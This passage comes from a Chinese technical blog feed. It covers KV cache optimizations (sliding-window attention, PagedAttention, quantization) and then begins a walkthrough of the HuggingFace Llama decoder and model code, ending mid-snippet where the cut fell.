的矩阵维度都是 seq_len）。至于舍弃的方式，又有几种不同的实现手段：</p><ol><li><p>固定窗口长度及其变种。如 <a href="https://arxiv.org/pdf/2004.05150v2.pdf">Longformer</a>，该方法实现简单：在注意力机制下，仅计算每个单词的前 w 个单词的注意力，其余单词对应的 Key 矩阵为零。每个单词仅计算前 w 个单词，类似于一个长 w 的窗口在序列上滑动（左二图）。于是空间复杂度被限制到了窗口最长大小上。此外，它还有很多变种，Dilated 滑动窗口间隔地计算单词注意力；Global 滑动窗口会间隔地计算单词的全局注意力，以尽可能消除对实验精度的影响。虽然实验表明该方法不论在时间和空间上相对原先的自注意力都有明显提升，但该方法对精度的影响较大。更多精彩内容可参加它的<a href="https://arxiv.org/pdf/2004.05150v2.pdf">论文</a>和<a href="https://www.geeksforgeeks.org/longformer/">相关博客</a>。<br><img src="https://media.geeksforgeeks.org/wp-content/uploads/20231108170402/Longformer-attention-Mechanism-file.png" alt=""></p></li><li><p>带有 KV 重计算的滑动窗口。该方法需要每次计算都重新计算从当前位置倒数 L 长度 token 序列的 KV 张量，但重计算的复杂度是 $ \mathcal{O}(NL^2) $ 。由于重计算的存在，其精度可以保证，也能节省空间，但是性能提升就不明显了。</p></li><li><p>箭型注意力窗口。该方法在 <a href="https://arxiv.org/pdf/2308.16137.pdf">LM-Infinit</a> 和 <a href="https://arxiv.org/pdf/2309.17453.pdf">StreamingLLM</a> 中均有提及。起因是大家发现了有趣的<em>注意力下沉</em>现象，即保持初始 token 的 KV 将在很大程度上恢复固定窗口后的注意力效果。于是，在窗口注意力的基础上，初始 token 的 KV 将被保留，从而在图上形成了一个“箭型”的注意力窗口。更多精彩内容可参考相关论文和<a href="https://medium.com/@zamalbabar/streaming-llm-when-your-language-model-becomes-a-memory-magician-afc603fd01cd">博客</a>。<br><img src="https://www.kdnuggets.com/wp-content/uploads/wijaya_introduction_streamingllm_llms_infinitelength_inputs_1.png" alt=""></p></li></ol><h3 id="PageAttention-优化">PageAttention 优化</h3><p><a href="https://github.com/vllm-project/vllm">vLLM</a> 提出的 <a href="https://blog.vllm.ai/2023/06/20/vllm.html">Paged Attention</a> 技术从显存管理的角度出发，通过允许非连续的内存空间存储 KV cache 的方式高效地计算注意力。其灵感来自于操作系统中虚拟内存和分页的思想。</p><p>通常，我们会采取批处理的方式完成深度学习模型的推理：同时处理 <code>batch_size</code> 个输入序列，从而更高效地利用了内存带宽，提高 GPU 利用率。然而，该传统的批处理方法不太适用于 LLM，因为它非常不灵活。前文提到，LLM 推理是迭代地输出一个个 token ，且每次输出产生多少 token 完全依赖于用户输入。于是批处理时会出现这样的情况：某些输入已经提前完成“回答”，产生了所有输出 token，但某些还在继续输出 token，见下右图。由于传统批处理方法非常不灵活，在最后一个序列未完成前，无法释放这些批处理的占用内存资源。于是，图中所示 GPU 在批次的处理中有很多内存空间和时间未被充分利用（序列1、3和4的序列末标记后的白色方块）。</p><center><img src="https://images.ctfassets.net/xjan103pcp94/1LJioEsEdQQpDCxYNWirU6/82b9fbfc5b78b10c1d4508b60e72fdcf/cb_02_diagram-static-batching.png"></center><blockquote><p>题外话，<a href="https://www.usenix.org/system/files/osdi22-yu.pdf">ORCA 这篇论文</a><br>也注意到了这一点，并认为是不灵活的批处理调度机制导致了这一问题：只要通过细粒度的调度机制将这些“白块”补齐了就行。于是，他们提出了迭代层级的批处理调度方式(iteration-level scheduling)和选择性批处理(selective batching)，让基于 FasterTransformer 的 GPT-3 175B 延迟和吞吐量都提高了约 37 倍。</p></blockquote><p>Paged Attention 将 KV cache 分割到不同的固定大小的“页”上。<a href="https://www.anyscale.com/blog/continuous-batching-llm-inference">然而，这也意味着，关于 KV cache 的分配是 just-in-time 的，而不是提前预分配好的</a>：当开始新一轮 token 生成时，框架不能分配固定大小的连续 cache 给 KV 张量。相反，在每次迭代开始前，调度器都可以决定是否需要为这一轮迭代动态地分配内存空间。</p><p>一旦我们将 KV cache 的分配类比到操作系统中对内存的分配，我们就可以将 KV cache 内的每个固定长度的块当作虚拟内存中的页，token 可以看作字节，每个生成序列看作进程。通过一个映射表可将连续的逻辑块映射到非连续的物理块，而物理块可以根据新生成的 token 按需分配：</p><p><img src="https://blog.vllm.ai/figures/annimation0.gif" alt=""></p><p>上图的 gif 清晰地展示了生成 token 的过程，逻辑 KV cache 是连续的，当它被填满后会重新分配一个物理 KV 块来存放新的 token。在分块之后，只有最后一个块可能会浪费内存。这么做的好处很明显：系统可以在一个batch中同时输入更多的序列，提升GPU的利用率，显著地提升吞吐量。</p><p>paged Attention 的另一个好处是高效内存共享。例如，在并行采样的时候，一个输入序列(prompt)需要生成多个输出序列。这种情况下，对于这个输入序列的计算和内存可以在输出序列之间共享。</p><p><img src="https://blog.vllm.ai/figures/annimation2.gif" alt=""></p><p>通过块表可以自然地实现内存共享。类似进程之间共享物理页，在 Paged Attention 中的不同序列通过映射便可实现共享。为了确保安全共享，Paged Attention 跟踪物理块的引用计数，并实现了 Copy-on-Write 机制。 内存共享减少了 55% 内存使用量，大大降低了采样算法的内存开销，同时提升了 2.2 倍的吞吐量。</p><p><img src="https://blog.vllm.ai/figures/annimation3.gif" alt=""></p><p>更多关于 Paged Attention 的相关细节和用法，可参考他们的<a href="https://arxiv.org/pdf/2309.06180.pdf">论文</a>与<a href="https://github.com/vllm-project/vllm">开源工程</a></p><h3 id="量化稀疏">量化稀疏</h3><p>该类方法从数据类型入手，充分利用每一个 bit。通过量化与稀疏压缩 KV cache 的显存消耗。</p><p>当前主流推理框架都在逐步支持 KV cache 量化，一个典型的案例是 <a href="https://link.zhihu.com/?target=https%3A//github.com/InternLM/lmdeploy">lmdeploy</a></p><h2 id="小结">小结</h2><p>本篇博客从大模型推理的过程出发，重点讲了 KV Cache 的原理与实现，粗略罗列了针对 KV Cache 的若干优化方法。大模型还在快速发展迭代，本博客也将实时更新。</p><p>为完成本篇博客，本人学习参考了许多知乎文章、外文博客和相关论文（相关链接都在文中以超链接的方式给出）。我在此一并感谢这些文章的作者们，是他们的辛勤劳作、共享传播和源码开放推动了 AI 领域的蓬勃发展。</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>Transformer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>huggingface下llama代码细读（下）</title>
    <link href="/2023/11/30/2023-11-30-huggingface2/"/>
    <url>/2023/11/30/2023-11-30-huggingface2/</url>
    
    <content type="html"><![CDATA[<h1>huggingface下llama代码细读（下）</h1><h2 id="前言">前言</h2><p>上篇博客我们重点介绍了 llama 模型，并讨论了它的架构、基件和中间件等。碍于篇幅关系，我将 transformer llama 的代码解读下半部分移动到了本篇博客中，要想从头开始的读者们可以参考<a href="https://dingfen.github.io/ai/2023/10/30/huggingface1.html">这篇博客</a>。</p><h2 id="llama-模型">llama 模型</h2><center><img src="/img/LLM/llama.png"></center><h3 id="译码层">译码层</h3><p>在了解了构成 llama 的基本组件后，要如何搭建起大模型的“高楼大厦”？当然不能一步登天，而要步步为营。在大模型推理阶段，输入的文本序列会经过多个译码层，执行自注意力等运算。译码层由 <code>LlamaDecoderLayer</code> 类表示，它将 <code>LlamaAttention</code> <code>LlamaRMSNorm</code> 等基件组合起来。上图所展示的架构就是一个译码层的架构。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LlamaDecoderLayer</span>(nn.Module):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config: LlamaConfig</span>):<br>    <span class="hljs-built_in">super</span>().__init__()<br>    self.hidden_size = config.hidden_size<br>    self.self_attn = (<br>        LlamaAttention(config=config)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">getattr</span>(config, <span class="hljs-string">&quot;_flash_attn_2_enabled&quot;</span>, <span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">else</span> LlamaFlashAttention2(config=config)<br>    )<br>    self.mlp = LlamaMLP(config)<br>    self.input_layernorm = LlamaRMSNorm(config.hidden_size, eps=config.rms_norm_eps)<br>    self.post_attention_layernorm = LlamaRMSNorm(config.hidden_size, eps=config.rms_norm_eps)<br></code></pre></td></tr></table></figure><p>上面的构造函数罗列了译码层的几个组件：自注意力层，MLP 层和两个 RMSNorm 层，而其 forward 函数则更详细地展示了架构图内张量的执行情况：13 行先将输入执行一次 RMSNorm 归一，16-25 行执行一次注意力运算，加上了残差结构，再执行一次 RMSNorm 归一，27-33 行将注意力结果输出到 MLP 中，最后返回结果👇。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params"></span><br><span class="hljs-params">  self,</span><br><span class="hljs-params">  hidden_states: torch.Tensor,</span><br><span class="hljs-params">  attention_mask: <span class="hljs-type">Optional</span>[torch.Tensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  position_ids: <span class="hljs-type">Optional</span>[torch.LongTensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  past_key_value: <span class="hljs-type">Optional</span>[<span class="hljs-type">Tuple</span>[torch.Tensor]] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  output_attentions: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">False</span>,</span><br><span class="hljs-params">  use_cache: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">False</span>,</span><br><span class="hljs-params">  **kwargs,</span><br><span class="hljs-params"></span>) -&gt; <span class="hljs-type">Tuple</span>[torch.FloatTensor, <span class="hljs-type">Optional</span>[<span class="hljs-type">Tuple</span>[torch.FloatTensor, torch.FloatTensor]]]:<br><br>  residual = hidden_states<br><br>  hidden_states = self.input_layernorm(hidden_states)<br><br>  <span class="hljs-comment"># Self Attention</span><br>  hidden_states, self_attn_weights, present_key_value = self.self_attn(<br>      hidden_states=hidden_states,<br>      attention_mask=attention_mask,<br>      position_ids=position_ids,<br>      past_key_value=past_key_value,<br>      output_attentions=output_attentions,<br>      use_cache=use_cache,<br>      **kwargs,<br>  )<br>  hidden_states = residual + hidden_states<br><br>  <span class="hljs-comment"># Fully Connected</span><br>  residual = hidden_states<br>  hidden_states = self.post_attention_layernorm(hidden_states)<br>  hidden_states = self.mlp(hidden_states)<br>  hidden_states = residual + hidden_states<br><br>  outputs = (hidden_states,)<br><br>  <span class="hljs-keyword">if</span> output_attentions:<br>      outputs += (self_attn_weights,)<br><br>  <span class="hljs-keyword">if</span> use_cache:<br>      outputs += (present_key_value,)<br><br>  <span class="hljs-keyword">return</span> outputs<br></code></pre></td></tr></table></figure><h3 id="llama-Model">llama Model</h3><p><code>LlamaModel</code> 由上面介绍的多个 <code>LlamaDecoderLayer</code> 堆叠而成。以之前的 llama-7b-hf 参数为例，<code>num_hidden_layers</code> 为32，意思是该模型一共堆叠了 32 层译码层。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;architecture&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;LlamaForCausalLM&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;hidden_act&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;silu&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;hidden_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4096</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;initializer_range&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.02</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;intermediate_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11008</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;max_position_embeddings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4096</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;model_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;llama&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;num_attention_heads&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;num_hidden_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;num_key_value_heads&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;pretraining_tp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;rms_norm_eps&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1e-05</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>除此之外，Llama 模型在输入的最前头加入了一个嵌入层（Embedding），最后又加了一层 RMSNorm 进行归一，下面是它的构造函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LlamaModel</span>(<span class="hljs-title class_ inherited__">LlamaPreTrainedModel</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Transformer decoder consisting of *config.num_hidden_layers* layers. Each layer is a [`LlamaDecoderLayer`]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config: LlamaConfig</span>):<br>    <span class="hljs-built_in">super</span>().__init__(config)<br>    self.padding_idx = config.pad_token_id<br>    self.vocab_size = config.vocab_size<br><br>    self.embed_tokens = nn.Embedding(config.vocab_size, config.hidden_size, self.padding_idx)<br>    self.layers = nn.ModuleList([LlamaDecoderLayer(config) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(config.num_hidden_layers)])<br>    self.norm = LlamaRMSNorm(config.hidden_size, eps=config.rms_norm_eps)<br><br>    self.gradient_checkpointing = <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># Initialize weights and apply final processing</span><br>    self.post_init()<br></code></pre></td></tr></table></figure><p><code>LlamaModel</code> 类继承自 <code>LlamaPreTrainedModel</code>，<code>LlamaPreTrainedModel</code> 没有那么神秘，只不过是在 <code>LlamaDecoderLayer</code> 的基础上包裹了一些初始化操作而已：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LlamaPreTrainedModel</span>(<span class="hljs-title class_ inherited__">PreTrainedModel</span>):<br>  config_class = LlamaConfig<br>  base_model_prefix = <span class="hljs-string">&quot;model&quot;</span><br>  supports_gradient_checkpointing = <span class="hljs-literal">True</span><br>  _no_split_modules = [<span class="hljs-string">&quot;LlamaDecoderLayer&quot;</span>]<br>  _skip_keys_device_placement = <span class="hljs-string">&quot;past_key_values&quot;</span><br>  _supports_flash_attn_2 = <span class="hljs-literal">True</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_init_weights</span>(<span class="hljs-params">self, module</span>):<br>    std = self.config.initializer_range<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(module, nn.Linear):<br>        module.weight.data.normal_(mean=<span class="hljs-number">0.0</span>, std=std)<br>        <span class="hljs-keyword">if</span> module.bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            module.bias.data.zero_()<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(module, nn.Embedding):<br>        module.weight.data.normal_(mean=<span class="hljs-number">0.0</span>, std=std)<br>        <span class="hljs-keyword">if</span> module.padding_idx <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            module.weight.data[module.padding_idx].zero_()<br></code></pre></td></tr></table></figure><h4 id="Llama-模型的推理过程">Llama 模型的推理过程</h4><p>我们从 <code>LlamaModel</code> 代码中已经了解到，Llama 模型将 32 层译码层堆叠起来，输入的文本序列经过一层层译码被最终转化成输出序列。而 <code>LlamaModel::forward</code> 作为整个大模型“未封装的”入口，显得尤为重要。</p><p><strong>参数一览</strong></p><p>既然是个入口，我们首先从它的参数入手：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params"></span><br><span class="hljs-params">    self,</span><br><span class="hljs-params">    input_ids: torch.LongTensor = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    attention_mask: <span class="hljs-type">Optional</span>[torch.Tensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    position_ids: <span class="hljs-type">Optional</span>[torch.LongTensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    past_key_values: <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[torch.FloatTensor]] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    inputs_embeds: <span class="hljs-type">Optional</span>[torch.FloatTensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    use_cache: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    output_attentions: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    output_hidden_states: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    return_dict: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">  </span>) -&gt; <span class="hljs-type">Union</span>[<span class="hljs-type">Tuple</span>, BaseModelOutputWithPast]:<br></code></pre></td></tr></table></figure><ul><li>input_ids 可简单理解为输入的文本序列</li><li>attention_mask 注意力掩码，1 表示未遮掩，0 表示遮掩。通常会使用下三角矩阵对输出进行遮盖，防止模型作弊。</li><li>position_ids 输入文本序列的位置编号，从 0 开始</li><li>past_key_values 若 use_cache 为真则之前的kv值会被用于加速推理</li><li>inputs_embeds 模型支持直接传入 input 的嵌入张量，代替 input_ids</li><li>use_cache 是否使用 KV cache 加速推理，通过使用 cache 缓存权重等值加速推理</li><li>output_attentions 是否要返回所有注意力层的注意力张量</li><li>output_hidden_states 是否要返回所有层的隐藏层状态张量</li><li>return_dict 指示返回的类型是 <code>~utils.ModelOutput</code> 还是 tuple</li></ul><p><strong>masked Attention</strong></p><p>接下来看看 forward 的实现。略去错误机制和其他准备过程，来看看神秘的 <code>attention_mask</code> 如何被准备的。回顾一下 transformers 机制里的注意力掩码，它是用来在训练和推理时遮挡后续部分的输出，防止模型看到未来的输出而“作弊”用的。从公式的角度看，$ MaskAttn=softmax(\frac{QK^T}{\sqrt{d_k}}+masked)V $ ，公式的前半部分主要在计算注意力矩阵，而 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>是我们输入的矩阵，既然掩码是为了防止<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>偷看到未来输出的权重的，那么掩码就应该是下三角矩阵，右上部分应该置为很小的负数。</p><p>这点从代码中也可以得到验证，在此不得不感慨代码更新速度之快：现在最新版本的 transformers 代码使用 <code>_prepare_4d_causal_attention_mask</code>，而 4.37 之前的版本使用的函数还是 <code>_expand_mask</code>、<code>_make_causal_mask</code> 🙌：</p><p><code>input_ids</code> 是我们输入的文本矩阵，维度通常是 <code>(batch_size, seq_len)</code>。因此代码前四行也是如此提取出 <code>batch_size</code> 和 <code>seq_len</code> 的。<code>position_ios</code> 给我们输入的文本单词从 0 或 <code>past_key_values_length</code> 开始编号。随后，15 行将 <code>input_ids</code> 推入嵌入层，推理正式开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ... to be continued some are omitted</span><br>  input_ids <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    batch_size, seq_length = input_ids.shape[:<span class="hljs-number">2</span>]<br>  <span class="hljs-keyword">elif</span> inputs_embeds <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    batch_size, seq_length = inputs_embeds.shape[:<span class="hljs-number">2</span>]<br><br>  past_key_values_length = past_key_values[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].shape[<span class="hljs-number">2</span>]<br><br>  <span class="hljs-keyword">if</span> position_ids <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    position_ids = torch.arange(<br>        past_key_values_length, seq_length + past_key_values_length, dtype=torch.long, device=device<br>    )<br>    position_ids = position_ids.unsqueeze(<span class="hljs-number">0</span>)<br><br>  <span class="hljs-keyword">if</span> inputs_embeds <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    inputs_embeds = self.embed_tokens(input_ids)<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">getattr</span>(self.config, <span class="hljs-string">&quot;_flash_attn_2_enabled&quot;</span>, <span class="hljs-literal">False</span>):<br>    <span class="hljs-comment"># 2d mask is passed through the layers</span><br>    attention_mask = attention_mask <span class="hljs-keyword">if</span> (attention_mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> <span class="hljs-keyword">in</span> attention_mask) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 4d mask is passed through the layers</span><br>    attention_mask = _prepare_4d_causal_attention_mask(<br>      attention_mask, (batch_size, seq_length), inputs_embeds, past_key_values_length<br>    )<br><br>  <span class="hljs-comment"># embed positions</span><br>  hidden_states = inputs_embeds<br></code></pre></td></tr></table></figure><p>再之后，代码开始使用库内函数准备注意力掩码了，行，那就让我们看看 <code>_prepare_4d_causal_attention_mask</code> 函数里到底卖的什么药：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_prepare_4d_causal_attention_mask</span>(<span class="hljs-params"></span><br><span class="hljs-params">  attention_mask: <span class="hljs-type">Optional</span>[torch.Tensor],</span><br><span class="hljs-params">  input_shape: <span class="hljs-type">Union</span>[torch.Size, <span class="hljs-type">Tuple</span>, <span class="hljs-type">List</span>],</span><br><span class="hljs-params">  inputs_embeds: torch.Tensor,</span><br><span class="hljs-params">  past_key_values_length: <span class="hljs-built_in">int</span>,</span><br><span class="hljs-params">  sliding_window: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">int</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params"></span>):<br>  attn_mask_converter = AttentionMaskConverter(is_causal=<span class="hljs-literal">True</span>, sliding_window=sliding_window)<br>  key_value_length = input_shape[-<span class="hljs-number">1</span>] + past_key_values_length<br><br>  <span class="hljs-comment"># 4d mask is passed through the layers</span><br>  <span class="hljs-keyword">if</span> attention_mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    attention_mask = attn_mask_converter.to_4d(<br>      attention_mask, input_shape[-<span class="hljs-number">1</span>], key_value_length, dtype=inputs_embeds.dtype<br>    )<br>  <span class="hljs-keyword">else</span>:<br>    attention_mask = attn_mask_converter.to_causal_4d(<br>      input_shape[<span class="hljs-number">0</span>], input_shape[-<span class="hljs-number">1</span>], key_value_length, dtype=inputs_embeds.dtype, device=inputs_embeds.device<br>    )<br><br>  <span class="hljs-keyword">return</span> attention_mask<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_causal_4d</span>(<span class="hljs-params"></span><br><span class="hljs-params">  self,</span><br><span class="hljs-params">  batch_size: <span class="hljs-built_in">int</span>,</span><br><span class="hljs-params">  query_length: <span class="hljs-built_in">int</span>,</span><br><span class="hljs-params">  key_value_length: <span class="hljs-built_in">int</span>,</span><br><span class="hljs-params">  dtype: torch.dtype = torch.float32,</span><br><span class="hljs-params">  device: <span class="hljs-type">Union</span>[torch.device, <span class="hljs-string">&quot;str&quot;</span>] = <span class="hljs-string">&quot;cpu&quot;</span>,</span><br><span class="hljs-params"></span>) -&gt; torch.Tensor:<br>  <span class="hljs-comment"># If shape is not cached, create a new causal mask and cache it</span><br>  input_shape = (batch_size, query_length)<br>  